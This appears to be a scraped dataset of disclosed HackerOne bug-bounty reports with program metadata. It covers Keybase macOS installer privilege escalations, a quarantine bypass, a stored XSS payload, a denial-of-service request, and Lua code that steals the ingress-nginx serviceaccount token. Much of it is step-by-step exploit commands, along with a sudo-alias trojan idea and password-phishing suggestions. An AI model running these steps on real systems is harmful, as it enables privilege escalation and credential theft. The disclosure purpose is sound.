Using a bug any user can change the keybase and git-remote-keybase symlinks in the /usr/locale/bin folder. We can exploit this to run arbitrary code as the user.
Steps to reproduce

In the example I will use the low privileged nobody account (could be any other account) and I will target the u3mur4 admin user.

Code 190 BytesWrap lines Copy Download1➜ ~ sudo -u nobody bash
2Password:
3bash-3.2$ id
4uid=4294967294(nobody) gid=4294967294(nobody) groups=4294967294(nobody),12(everyone),61(localaccounts),702(2),701(1),100(_lpoperator)
5bash-3.2$

Create the /var/tmp/poc/Contents/SharedSupport/bin folder structure with 2 symlinks which are pointing to the original keybase and git-remote-keybase binaries.

Code 705 BytesWrap lines Copy Download1bash-3.2$ mkdir -p /var/tmp/poc/Contents/SharedSupport/bin
2bash-3.2$ cd /var/tmp/poc/Contents/SharedSupport/bin
3bash-3.2$ ln -s /Applications/Keybase.app/Contents/SharedSupport/bin/keybase keybase
4bash-3.2$ ln -s /Applications/Keybase.app/Contents/SharedSupport/bin/git-remote-keybase git-remote-keybase
5bash-3.2$ ls -lah .
6total 16
7drwxr-xr-x  4 nobody  wheel   136B Jan 24 03:31 .
8drwxr-xr-x  3 nobody  wheel   102B Jan 24 03:30 ..
9lrwxr-xr-x  1 nobody  wheel    71B Jan 24 03:31 git-remote-keybase -> /Applications/Keybase.app/Contents/SharedSupport/bin/git-remote-keybase
10lrwxr-xr-x  1 nobody  wheel    60B Jan 24 03:31 keybase -> /Applications/Keybase.app/Contents/SharedSupport/bin/keybase
11bash-3.2$

The nobody user has write permission to /var/tmp directory and content of the directory is preserved between reboots. 


Run the keybase installer command with --app-path=/Applications/Keybase.app/../../var/tmp/poc and the install-cli flag.

Code 1.12 KiBWrap lines Copy Download1bash-3.2$ /Applications/Keybase.app/Contents/Resources/KeybaseInstaller.app/Contents/MacOS/Keybase --run-mode=prod --timeout=10 --debug --app-path=/Applications/Keybase.app/../../var/tmp/poc --install-cli
2[REMOVED]
301.24.2019 03:39:54.411 KBCommandLine:38[DEBG] Helper: addToPath({
4    appName = Keybase;
5    directory = ""/Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin"";
6    name = keybase;
7})
801.24.2019 03:39:54.414 KBCommandLine:40[DEBG] Result: {
9    path = ""/usr/local/bin/keybase"";
10}
1101.24.2019 03:39:54.414 KBCommandLine:47[DEBG] Helper: addToPath({
12    appName = Keybase;
13    directory = ""/Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin"";
14    name = ""git-remote-keybase"";
15})
1601.24.2019 03:39:54.419 KBCommandLine:49[DEBG] Result: {
17    path = ""/usr/local/bin/git-remote-keybase"";
18}
1901.24.2019 03:39:54.419 KBCommandLine:131[INFO] Link resolved to path: /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase <=> /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase
2001.24.2019 03:39:54.419 KBInstaller:45[INFO] Install complete
21[REMOVED]
22bash-3.2$

Check that in the /usr/local/bin folder the keybase and git-remote-keybase links are changed to our specified links.

Code 1.01 KiBWrap lines Copy Download1bash-3.2$ ls -lah /usr/local/bin/
2total 80
3drwxrwxr-x  12 u3mur4  admin   408B Jan 24 02:44 .
4drwxr-xr-x  15 root    wheel   510B Jan 16 07:33 ..
5lrwxr-xr-x   1 u3mur4  admin    28B Jan 16 05:32 brew -> /usr/local/Homebrew/bin/brew
6-rwxr-xr-x   1 root    admin   538B Jan 16 06:30 fuzzy_match
7lrwxr-xr-x   1 u3mur4  admin    89B Jan 24 02:44 git-remote-keybase -> /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/git-remote-keybase
8lrwxr-xr-x   1 u3mur4  admin    29B Jan 16 05:44 htop -> ../Cellar/htop/2.2.0/bin/htop
9lrwxr-xr-x   1 u3mur4  admin    78B Jan 24 02:44 keybase -> /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase
10-rwxr-xr-x   1 root    admin   526B Jan 16 06:30 pod
11-rwxr-xr-x   1 root    admin   534B Jan 16 06:30 sandbox-pod
12-rwxr-xr-x   1 root    admin   532B Jan 16 06:30 xcodeproj
13lrwxr-xr-x   1 u3mur4  admin    29B Jan 23 22:42 zsh -> ../Cellar/zsh/5.6.2_1/bin/zsh
14lrwxr-xr-x   1 u3mur4  admin    35B Jan 23 22:42 zsh-5.6.2 -> ../Cellar/zsh/5.6.2_1/bin/zsh-5.6.2

Notice that the nobody account has no permission the change these links directly.


Remove our links in the /var/tmp/poc/Contents/SharedSupport/bin/ folder and create some executable files. In the example I will just simply use the id command and I forward the flags to the original binaries.

Code 401 BytesWrap lines Copy Download1bash-3.2$ ls
2git-remote-keybase	keybase
3bash-3.2$ rm keybase git-remote-keybase
4bash-3.2$ cat <<EOF >> keybase
5#!/bin/bash
6id >> /tmp/out
7/Applications/Keybase.app/Contents/SharedSupport/bin/keybase \$@
8EOF
9bash-3.2$ cat <<EOF >> git-remote-keybase
10#!/bin/bash
11id >> /tmp/out
12/Applications/Keybase.app/Contents/SharedSupport/bin/git-remote-keybase \$@
13EOF
14bash-3.2$ chmod +x keybase git-remote-keybase

Wait until the u3mur4 account using the git clone keybase:// or the keybase command.

Code 385 BytesWrap lines Copy Download1➜  ~ id
2uid=501(u3mur4) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),702(2),701(1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)
3➜  ~ keybase
4NAME:
5   keybase - Keybase command line client.
6[REMOVED]
Check the /tmp/out file. 
Code 339 BytesWrap lines Copy Download1bash-3.2$ cat /tmp/out
2uid=501(u3mur4) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),702(2),701(1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)
3bash-3.2$

Notice that the u3mur4 account executed our binary because we could change the symlinks in the /usr/local/bin directory. From now on we can access any file and run arbitrary command as the targeted account. Also we can access the private keybase folder of the user and other sensitive data.


How to become root?

Because we can run arbitrary code as the targeted user we have multiple ways to achieve root privileges. By using misconfigurations with a little bit of social engineering you can get your victim to escalate you to root without realizing it.


By adding this line to the users .bash_profile: alias sudo='sudo sh -c '\''evil.sh & exec ""$@""'\'' sh'. We can change the behavior of what happens when the user runs “sudo”.


AppleScript is fairly simple, and can be used to phish for passwords for nearly anything.  If you can acquire the password of an administrator user, you can escalate to root. So when the user runs the keybase binary we can create a popup that the 'keybase helper need to update...' and the user have to enter the password.


This will work up until El Capitan: The sudoers policy caches credentials for 5 minutes, unless overridden in sudoers(5). What this means is that once a user runs sudo, they can run a command with sudo again for up to 5 minutes without having to enter their password again.


Short version (see source 2): Homebrew changes the permissions on /usr/local/bin to the user (or any process running as the user) is able to write files to it and give those files executable permissions. Now if you (or someone else, or some other program) were to place a program called sudo in /usr/local/bin, then every time you typed sudo it would be that program that would be executed, not the real one.


etc...


source1 - privilege-escalation-on-os-x-without-exploits
source2 - how-homebrew-invites-users-to-get-pwned
Why can we change the symlinks?

the 3th item is the most important


In the client/osx/Installer/Options.m:125 file

Code 100 BytesWrap lines Copy Download1NSString *servicePath = [self.appPath stringByAppendingPathComponent:@""Contents/SharedSupport/bin""];
the code appends the Contents/SharedSupport/bin path to the specified appPath. We specified appPath in step 2 as /Applications/Keybase.app/../../var/tmp/poc. After appending the path, the servicePath becomes /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin which resolves to /var/tmp/poc/Contents/SharedSupport/bin. That is why we created the directory structure specified in step 2.

In the client/osx/KBKit/KBKit/Component/KBCommandLine.m:26 file

Code 195 BytesWrap lines Copy Download1...
2  if (![self.config isInApplications:self.servicePath]) {
3    completion(KBMakeWarning(@""Command line install is not supported from this location: %@"", self.servicePath));
4    return;
5  }
6...
the code checks that the servicePath start with /Application. That is why we specify the /Application... appPath with the ../.. components in step 3.

In the client/osx/Helper/KBHelper.m:371 file the install function will call the checkAbsolutePath function with path=/Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase and prefix=/Applications/Keybase.app arguments.

Code 699 BytesWrap lines Copy Download1/*
2 * check that the path path has the prefix prefix, being wise to
3 * whatever attacks people will throw at us, like /a/b/../../.., etc
4 */
5+(BOOL)checkAbsolutePath:(NSString *)path hasAbsolutePrefix:(NSString *)prefix {
6    if (!prefix.absolutePath) {
7        return NO;
8    }
9    if (!path.absolutePath) {
10        return NO;
11    }
12    NSArray *a = [path.stringByStandardizingPath componentsSeparatedByString:@""/""];
13    NSArray *b = [prefix.stringByStandardizingPath componentsSeparatedByString:@""/""];
14    if (a.count < b.count) {
15        return NO;
16    }
17
18    for (int i = 0; i < b.count; i++) {
19        if (![a[i] isEqualToString:b[i]]) {
20            return NO;
21        }
22    }
23    return YES;
24}
The a (path) array becomes ["""", Application, ""Keybase.app"", Contents, SharedSupport, bin, keybase]. So the stringByStandardizingPath function will resolves the /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase link that is why it will start as the b ["""", Application, ""Keybase.app""] array. The function will return YES and the add addToPath function will create the link.

In the client/osx/KBKit/KBKit/Component/KBCommandLine.m:125-137 file

Code 593 BytesWrap lines Copy Download1- (BOOL)linkedToServicePath {
2  NSString *linkDir = @""/usr/local/bin"";
3  NSString *linkPath = [NSString stringWithFormat:@""%@/%@"", linkDir, self.config.serviceBinName];
4  NSString *shouldResolveToPath = [NSString stringWithFormat:@""%@/%@"", self.servicePath, self.config.serviceBinName];
5  if ([NSFileManager.defaultManager fileExistsAtPath:linkDir]) {
6    NSString *resolved = [self resolveLinkPath:linkPath];
7    DDLogInfo(@""Link resolved to path: %@ <=> %@"", resolved, shouldResolveToPath);
8    if ([resolved isEqualToString:shouldResolveToPath]) {
9      return YES;
10    }
11  }
12  return NO;
13}
the code checks that /usr/local/bin + serviceBinName link resolves to the same place as our specified servicePath (appPath + Contents/SharedSupport/bin) + serviceBinName. That is why we created two symlink to the original binaries in step 2.

Notice that we have permission to remove, modify later this link, (in step 4 and 5).

Impact
Unauthorized access is possible which impacts the confidentially, integrity, and availability of the system.",https://hackerone.com/reports/485407,New York,United States,New York,2019,1,24,16,33
Keybase,11-50,0.0,1m-10m,"$4,000.00",Medium,4.6,None,"Keybase client: downloaded executables lack ""com.apple.quarantine"" meta-attribute [macOS]","metnew  submitted a report to Keybase.Oct 29th (4 years ago)Summary


Missing quarantine attribute for downloaded files allows remote attacker to send executable file that won't be checked by Gatekeeper (codesign bypass). 


Since sent executable files lack com.apple.quarantine meta-attribute, no alert about launching executable file from the web will be shown to user.


That means, dblclick on file in Finder.app (or any similar gesture to launch the file) immediately launches the attacker's file.


PoC

Attacker sends exploit.terminal to the victim (file is unsigned)
Victim opens exploit.terminal
No alert from Gatekeeper about unsigned executable
No alert about running executable file downloaded from the web
Shell commands from exploit.terminal execute with user-level privileges.


NOTE: if victim is sudoer with no pass, attacker can insert sudo commands in *.terminal file and gain root permissions.

Screencast + exploit.terminal file sample attached.

Screencast: xattr <file> shows apple-specific meta-attributes like com.apple.quarantine

Impact
Quarantine + codesigning are basic security mechanisms, which prevents user/device from running untrusted executables.
Keybase allows to send messages and share KBFS with any Keybase user (!), that allows attacker to make a massive spam of .terminal files with malicious payload.2 attachments:F368059: keybase-terminal-files.mp4F368060: exploit.terminalSummary by metnewInsufficient quarantine handling in Keybase allowed a remote attacker to execute code on a target macOS device via shortcut file pointing to the synced asset. (1 click RCE via file shortcut)
Paths to synced files is known to attacker: /keybase/public/attacker,victim/<file>
The vulnerability initially was reported for macOS. However, Keybase team found that Windows version has a similar issue with MOTW additionally leading to DLL hijacking scenarios.
I want to thank the @keybase team for giving a chance to other companies to patch their products by not disclosing this report for a while.",https://hackerone.com/reports/430463,New York,United States,New York,2018,10,29,21,4
Keybase,11-50,0.0,1m-10m,"$2,000.00",Medium,5.45,Privilege Escalation,macOS privilege escalation,"u3mur4  submitted a report to Keybase.Feb 4th (4 years ago)Short description
We can add an arbitrary folder to the default $PATH environment variable, so we can exploit this to run arbitrary code as the targeted user.
Steps to reproduce

In the example I will use the low privileged nobody account (could be any other account) and I will target the u3mur4 admin user.

Code 180 BytesWrap lines Copy Download1➜ ~ sudo -u nobody bash
2Password:
3bash-3.2$ id
4uid=4294967294(nobody) gid=4294967294(nobody) groups=4294967294(nobody),12(everyone),61(localaccounts),702(2),701(1),100(_lpoperator)

Make sure the /usr/local/bin directory not exist.

Code 38 BytesWrap lines Copy Download1sudo mv /usr/local/bin /usr/local/bin2

By default this directory not exist.


Remove the /etc/paths.d/Keybase file using keybase installer with the --uninstall-cli flag.

Code 432 BytesWrap lines Copy Download1bash-3.2$ cat /etc/paths.d/Keybase
2/Applications/Keybase.app/Contents/SharedSupport/bin
3bash-3.2$ /Applications/Keybase.app/Contents/Resources/KeybaseInstaller.app/Contents/MacOS/Keybase --run-mode=prod --timeout=10 --debug --app-path='/Applications/Keybase.app' --uninstall-cli
4[REMOVED]
502.04.2019 02:30:24.274 Installer:109[INFO] Uninstalled
6bash-3.2$ cat /etc/paths.d/Keybase
7cat: /etc/paths.d/Keybase: No such file or directory

When the /usr/local/bin directory not exist the installer will create the /etc/paths.d/Keybase file.


Create the /var/tmp/poc/Contents/SharedSupport/bin folder structure and create an executable file named as keybase.

Code 196 BytesWrap lines Copy Download1bash-3.2$ mkdir -p /var/tmp/poc/Contents/SharedSupport/bin
2bash-3.2$ cd /var/tmp/poc/Contents/SharedSupport/bin
3bash-3.2$ cat <<EOF >> keybase
4#! /bin/bash
5echo test
6EOF
7bash-3.2$ chmod +x keybase

Run the keybase installer command with --app-path=/Applications/Keybase.app/:/var/tmp/poc and the --install-cli flag.

Code 887 BytesWrap lines Copy Download1bash-3.2$ /Applications/Keybase.app/Contents/Resources/KeybaseInstaller.app/Contents/MacOS/Keybase --run-mode=prod --timeout=10 --debug --app-path='/Applications/Keybase.app/:/var/tmp/poc' --install-cli
2[REMOVED]
302.04.2019 02:34:38.720 KBInstaller:32[DEBG] Install: CLI
402.04.2019 02:34:38.720 KBCommandLine:38[DEBG] Helper: addToPath({
5    appName = Keybase;
6    directory = ""/Applications/Keybase.app/:/var/tmp/poc/Contents/SharedSupport/bin"";
7    name = keybase;
8})
902.04.2019 02:34:38.723 KBCommandLine:40[DEBG] Result: {
10    path = ""/etc/paths.d/Keybase"";
11}
1202.04.2019 02:34:38.723 KBCommandLine:47[DEBG] Helper: addToPath({
13    appName = Keybase;
14    directory = ""/Applications/Keybase.app/:/var/tmp/poc/Contents/SharedSupport/bin"";
15    name = ""git-remote-keybase"";
16})
17[REMOVED]
18bash-3.2$ cat /etc/paths.d/Keybase
19/Applications/Keybase.app/:/var/tmp/poc/Contents/SharedSupport/bin

Wait until the targeted user opens a new terminal. The new terminal will load the paths from /etc/paths.d.

Code 562 BytesWrap lines Copy Download1➜  ~ id
2uid=501(u3mur4) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),702(2),701(1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)
3➜  ~ which keybase
4/var/tmp/poc/Contents/SharedSupport/bin/keybase
5➜  ~ /usr/libexec/path_helper
6PATH=""/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/Applications/Keybase.app/:/var/tmp/poc/Contents/SharedSupport/bin""; export PATH;
7➜  ~ keybase
8test
Why this works?
The checkIfPathIsFishy doesn't checks that the path contains the "":"" character. 
Code 472 BytesWrap lines Copy Download1(BOOL)checkIfPathIsFishy:(NSString *)path { 
2 NSArray *v = [path componentsSeparatedByString:@""/""]; 
3 for (int i = 0; i < v.count; i++) { 
4 if ([v[i] isEqualToString:@""..""]) { 
5 return YES; 
6 } 
7 if ([v[i] isEqualToString:@"".""]) { 
8 return YES; 
9 } 
10 } 
11 
12 // Do not allow ~ or $ characters in the path. 
13 if ([path rangeOfString:@""$""].location != NSNotFound) { 
14 return YES; 
15 } 
16 if ([path rangeOfString:@""~""].location != NSNotFound) { 
17 return YES; 
18 } 
19 return NO; 
20} 
The addToPath writes the path (/Applications/Keybase.app/:/var/tmp/poc/Contents/SharedSupport/bin) to the /etc/paths.d/Keybase file. The : will be interpreted as a search path separator and it will be added to the $PATH environment variable.
Code 1.11 KiBWrap lines Copy Download1  // If we don't have a /usr/local/bin then fall back to /etc/paths.d.
2  // Terminal will load /etc/profile, which uses /usr/libexec/path_helper which loads paths from /etc/paths.d.
3  // Some users will override the default usage of /etc/profile in Terminal though so this isn't guaranteed to
4  // include keybase in the path on those systems, however, these two cases should handle most of our users.
5
6  NSString *pathsd = @""/etc/paths.d"";
7
8  // On fresh Sierra install, /etc/paths.d doesn't exist
9  if (![NSFileManager.defaultManager fileExistsAtPath:pathsd]) {
10    NSError *error = nil;
11    if (![NSFileManager.defaultManager createDirectoryAtPath:pathsd withIntermediateDirectories:NO attributes:nil error:&error]) {
12      completion(error, nil);
13      return;
14    }
15  }
16
17  NSString *pathsdPath = [NSString stringWithFormat:@""%@/%@"", pathsd, appName];
18  if ([NSFileManager.defaultManager fileExistsAtPath:pathsdPath]) {
19    completion(nil, nil);
20    return;
21  }
22  NSError *error = nil;
23  [directory writeToFile:pathsdPath atomically:YES encoding:NSUTF8StringEncoding error:&error];
24  completion(error, @{@""path"": pathsdPath});
25}
Impact
Access other users personal files and execute commands as the user. If the user is root we could  immediately gain root privileges .",https://hackerone.com/reports/490960,New York,United States,New York,2019,2,4,11,54
Keybase,11-50,0.0,1m-10m,"$3,000.00",High,8.3,Cross-site Scripting (XSS) - Stored,"Persistent XSS on keybase.io via ""payload"" field in `/user/sigchain_signature.toffee` template","jordanmilne  submitted a report to Keybase.Jul 2nd (5 years ago)Issue
Keybase allows you to see other users' sigchains by navigating to https://keybase.io/<username\/sigchain>. The ""Payload"" field containing JSON related to the chainlink on the right side of the page is not correctly escaped during templating, leading to a persistent XSS as users have a high degree of control over the contents of that field.
Specifically, the /user/sigchain_signature.toffee template's compiled code contains:
Code 387 BytesWrap lines Copy Download1// ...
2                _to('      <textarea wrap=""off"" class=""form-control fixed full-payload autoselect"" rows=""20"" autocapitalize=""off"" autocorrect=""off"" autocomplete=""off"" spellcheck=""false"" readonly>');
3                _to("""" + JSON.stringify(JSON.parse(sig.payload_json), null, 2)); // < `payload_json` is user-controlled and not escaped!
4                _to(""</textarea>\n"");
5// ...
where normally there would be an escape() around the data being interpolated in to prevent special characters being interpreted as HTML.
Proof-of-Concept

Create a new account on https://keybase.io or remove all keys / associations from an existing account
Generate a GPG keypair locally and upload the public half via https://keybase.io. Make sure you import these into your GPG keychain.
When the site asks you to upload the private half, select ""maybe another time"", then select the option to sign the pubkey with ""command line with [bash + GPG + cURL]""
keybase.io will spit out a few lines of bash to paste into your terminal, copy this to a text editor.
Replace ""tag"":""signature"" section of the JSON payload in the cURL command with ""tag"":""</textarea><script>alert(1)</script>"". There's no particular reason we have to inject into the tag field, it was just the first field I saw that wasn't validated and was reflected in the ""payload"" field on the sigchain page.

You should have something like:
Code 2.82 KiBWrap lines Copy Download1curl \
2  --data-urlencode sig=""`\
3   echo '{""body"":{""key"":{""eldest_kid"":""01015d2654042fe3df8427efd4615406c4a57cbb2bbf3c4b1711f53aace9edf037480a"",""fingerprint"":""b54bac1da5887ffba91411894f6b7c0c98dc7571"",""full_hash"":""3ef468ca735aacdc3beee8f8ac1f88c4441a01a583598871721cd390d74fa465"",""host"":""keybase.io"",""key_id"":""4f6b7c0c98dc7571"",""kid"":""01015d2654042fe3df8427efd4615406c4a57cbb2bbf3c4b1711f53aace9edf037480a"",""uid"":""81d7b93a686f9bc7ff566eeb87bc8719"",""username"":""largenotesting""},""type"":""eldest"",""version"":1},""ctime"":1498970799,""expire_in"":157680000,""prev"":""d87dd6918ff960578d29d8c9fd47cfdd8256bc46ed288ff7475522574134a1a0"",""seqno"":19,""tag"":""</textarea><script>alert(1)</script>""}' | \
4   gpg -u 'b54bac1da5887ffba91411894f6b7c0c98dc7571' -a --sign`"" \
5  --data-urlencode type=""eldest"" \
6  --data-urlencode session=""<SESSION KEY>"" \
7  --data-urlencode csrf_token=""<CSRF TOKEN>"" \
8  --data-urlencode plain_out=""1"" \
9  --data-urlencode signing_kid=""01015d2654042fe3df8427efd4615406c4a57cbb2bbf3c4b1711f53aace9edf037480a"" \
10  --data-urlencode public_key=""-----BEGIN PGP PUBLIC KEY BLOCK-----
11Version: GnuPG v2
12
13mQENBFlYeiwBCADMIXo7d47rJpWwBVqr/obUBb0NpTh7cPnhSeoYPaIRVCPOm6ep
14HVOveqSheiIAJMVu+7sv70t67TTfszCp5lPCpgoGcotb74Eze7aF5DnoBY/kjGUt
151PwoiMvoTgmoXikWmPd24qb2+2kRRyCSsq93Dd8/Vk1DAcDxzRbvxlLCsFGWfNmr
16RmPYB31U8OuPp7n9+FqEAWXVxFl/5AswpfRhekwG1ujlRzv4Ufpnb1PGVTdhwI0j
17/+Mk+7gK5MqcbGUT/W2O0M01onWN0Xg8pDBliR2D2ePpI08GxV0BnBYhCWgYI683
18RWrgTuSaHNdS3TqwULehYKNSqB3U2OTsdL9ZABEBAAG0KXNvbWV0aGluZyA8YW5v
19dGhlcmtleWJhQHNheW5vdG9saW51eC5jb20+iQE3BBMBCAAhBQJZWHosAhsDBQsJ
20CAcCBhUICQoLAgQWAgMBAh4BAheAAAoJEE9rfAyY3HVxgLcH/RdkDjwgLwmIiOzh
21JY/EzcVApSqMWLEO7JQZCHUgJNq/h7HY6uHd12uEAirP+QRpDIE1h98YSeIxQLAR
22iWrmST/tR9PhmeUN1pYJfuPEW8PLDkefrKde+0XhvWoOzTvQNiYFGlCnP9BIiJky
23GzC0Tb7Dg8iVe032QjYCbqNyQkWmQ9ztM+j+mPHKTfMC1hzU+lOt4nexWlTSf/z6
244GURt131gIVBuQu7pm61QZP/u+dPdazho1ikmASNHHYkAnJFzMWQ7GDi7Lqns/mB
25W7XFEqbT4dOSeEOVkckiPNDcVFgdhPiDTm4VWzQAsYU/Zr3AhcxuBSQT6l11fvWb
26EmuWeFa5AQ0EWVh6LAEIAMOJF/a1Tz7Nwa5+FhpbBX0svIzpPCfREdDg0kO0cKWU
2781IWZZrDHqmlfxCnqPyB7XfrwFb40gIbBmi6mrZb5COo5pDQ7uE+cWn5cmpVVOqx
28kEjX8jEd0SzO5kBFevlVHlGrcO23tm2FuKZBHf69u2U15ivYijceJFnRCCyW0RFQ
29Cz9Rz9XBkth6x3SswBZQAT2qAaBnVwQv/YzleBH2cCUSxMkjLE8zjkFL8W+zEVGw
309NyWQHJ/TmaHeAojvRisJ1MyIpRLhFDn8h5PYuvZs8XRK7pen+PznIAtuYYfENCR
317tPqAp4yFkKhOBy7zQB9PUOoaZWxRwUs4HoDIkNSnWcAEQEAAYkBHwQYAQgACQUC
32WVh6LAIbDAAKCRBPa3wMmNx1ceKnB/905aQn5eJDo7Dva0AjDjYL6+mSf1eeMElF
33UUhqR3/ZVUrla5xX3N1wvnC5YfBAjXY4WpRtDFfNR35EA31kP8biAWs1bgaPybyr
34JZqHD7DQS+tccHKQd/ovNg5qFIh8KKv1pMI66n1GtG4C6btz8cbxhUj1WYfBbxdR
35egSWT5WEP+lm3+iSGg4C/yPOpvqdx7ORCLvje8v9lQ8XMOPwclvYsZKuydi4anT0
36sy7LbithYRusQrkO40qiTgsD6YHGZiN++SscMg04RYgRz/F37hYeWhZqwsnq4mt3
37lzONWNX5pQsSbP0dAiJvh8otImITQFUUnfu5z+jJCXdze9/2FV8z
38=1hmO
39-----END PGP PUBLIC KEY BLOCK-----"" \
40  --data-urlencode is_primary=""true"" \
41  --data-urlencode sig_required=""true"" \
42  https://keybase.io/_/api/1.0/key/add.json

Run the command, then go to https://keybase.io/<YOUR_USERNAME\/sigchain>. You should see an alert() box pop.

I can also make a profile that repros this issue if you like, I've cleared my profile since verifying this was an issue.
Impact
It seems like most sensitive functionality on keybase.io is behind a password re-entry wall, so if the victim didn't have a password manager that would autopopulate password fields on https://keybase.io the attacker would have to dump a fake login prompt into the DOM to be able to do anything ""interesting"". I suppose an attacker would at least be able to pull down the user's TripleSec-encrypted privkey bundles to perform an offline attack without any special user interaction.
However, the frontend JS references some admin-only API endpoints (viewing crashlogs, billing stuff, etc) that don't seem to require password re-auth. An XSS in the context of an admin user's session would probably allow an attacker to abuse those endpoints.
Remediation
The ""payload"" JSON should be escaped in the template like anything else in a text node. More generally, more of web frontend code should be switched to modern HTML templating techniques. There's a number of suspect instances of semi-user-controlled data being passed into HTML sinks like $.html(), $.append(), $.prepend(), etc.
The web frontend would also be a good candidate for CSP with nonces, since it doesn't seem to pull in third-party resources other than statics from S3, and that would have mitigated this XSS in most modern browsers.
Just let me know if you need any more details! Also, hi @chromakode!",https://hackerone.com/reports/245296,New York,United States,New York,2017,7,2,9,42
Keybase,11-50,0.0,1m-10m,$100.00,No value,0.0,Denial of Service,Denial of Service through set_preference.json,"cablej  submitted a report to Keybase.Sep 7th (6 years ago)Hey there,
When selecting an image at https://keybase.io/_/api/1.0/image/set_preference.json, passing an invalid value in identity_src knocks the server down for 20-30 seconds, with just one request. I have verified this by visiting an external website that checks if a website is down.
POC:

Connect either your twitter or github account with Keybase.
Select to edit your profile image, and select one of the images.
Repeat the request, such as in BurpSuite. Pass in a value to replacing identity_src. To prevent keeping the server down, I have only tried two values, 1043 and http://google.com. The server will error with 503 and will be down for 20-30 seconds. I have attached a screenshot from http://downoruprightnow.com/ verifying that the site is down.

Please let me know if you need any more information.1 attachment:F118171: Screen_Shot_2016-09-07_at_4.36.20_PM.png",https://hackerone.com/reports/166682,New York,United States,New York,2016,9,7,21,44
Kubernetes,251-500,0.0,200m-1b,"$2,500.00",High,7.6,Privilege Escalation,Authenticated kubernetes principal with restricted permissions can retrieve ingress-nginx serviceaccount token and secrets across all namespaces,"libio  submitted a report to Kubernetes.Jul 1st (about 1 year ago)Summary:
Retrieving ingress-nginx serviceaccount token
ingress-nginx allows adding custom snippets of nginx configuration to Kubernetes ingress objects. These snippets can be applied to either the relevant location {} or server {} blocks with the following annotations, respectively.

https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/annotations/#configuration-snippet
https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/annotations/#server-snippet

Inside the server {} block we can add a custom snippet of lua-code that reads the serviceaccount token that is mounted inside the ingress-nginx pod. We then set it as an nginx variable and return it to the client at a configured location. This might look like this:
Code 396 BytesWrap lines Copy Download1    nginx.ingress.kubernetes.io/server-snippet: |
2      set_by_lua $token '
3        local file = io.open(""/run/secrets/kubernetes.io/serviceaccount/token"")
4        if not file then return nil end
5        local content = file:read ""*a""
6        file:close()
7        return content
8      ';
9
10      location = /token {
11        content_by_lua_block {
12          ngx.say(ngx.var.token)
13        }
14      }
Impact
The ingress-nginx serviceaccount has the permissions to list secrets across all namespaces. With the ingress-nginx serviceaccount's token a user, with otherwise restricted privileges, can at least:

exfiltrate all kubernetes secrets
get tokens of all kubernetes serviceaccounts; allowing an attacker to elevate his privileges to potentially cluster-admin

Vendors such as rancher-labs bundle ingress-nginx, or a forked version of ingress-nginx, with their software. Solutions provided by these vendors might also be vulnerable.
kube-apiserver proxy
ingress-nginx can be configured to expose the Kubernetes kube-apiserver by creating a Kubernetes Service of type ExternalName and pointing it to kubernetes.default; the hostname at which the kubernetes api is available inside the cluster. This can expose an otherwise private and protected kube-apiserver to untrusted networks like the internet.
Requirements to exploit
To successfully exploit this vulnerability an attacker would need access to an already authenticated user or serviceaccount that has the permissions to create the following resources inside kubernetes:

ingress
service

Additionally the attacker needs network access to the ingress-nginx-controller loadbalancer or in-cluster service to retrieve the ingress-nginx serviceaccount token. The hostname configured in the ingress object does not necessarily have to resolve to the ingress-nginx-controller's loadbalancer; ingress-nginx will also serve us the token if we manually add the Host-header.
Kubernetes Version:
Any, as far as I am aware. This was tested with AWS EKS 1.20.
Component Version:
Any, as far as I am aware. This was tested with the following release of ingress-nginx:

chart: ingress-nginx-3.33.0
application: 0.47.0

Steps To Reproduce:
I created a proof-of-concept (poc.sh) that requires the following:

A kubernetes cluster with ingress-nginx installed; ingress-nginx should not be restricted to a single namespace
A local kubeconfig file configured to communicate with the kubernetes cluster
A user configured in the kubeconfig file with the permissions to create ingress and service objects in the namespace configured in the kubeconfig context

The proof-of-concept requires setting the INGRESS_HOST environment variable. This variable should contain a hostname that resolves to the ingress-nginx-controller's loadbalancer. This is made easy on clusters where a wildcard DNS-record is pointing to the loadbalancer.
When invoked, the script will:

Apply the required ingress and service;

exposing the ingress-nginx serviceaccount token at https://$INGRESS_HOST/token
proxying all requests to the kubernetes apiserver at https://$INGRESS_HOST


Retrieve the ingress-nginx serviceaccount token
Write a local kubeconfig;

Using the kube-apiserver proxy
Using the ingress-nginx serviceaccount token


Write secrets from all namespaces to a local file called secrets.json
For each serviceaccount token found in secrets.json check if the serviceaccount has cluster-admin privileges. If so, create a new user and context in the local kubeconfig file with the serviceaccount's token

Supporting Material/References:
filedescriptioningress.yamlkubernetes manifest used to create required service and ingress objectspoc.shproof-of-concept written in bashoutput.pngoutput of running poc.sh against local test cluster<br>getting cluster-admin by finding the serviceaccount tokens of flux and flux-helm-operator
Impact

exfiltrate all kubernetes secrets
get tokens of all kubernetes serviceaccounts; allowing an attacker to elevate his privileges to potentially cluster-admin
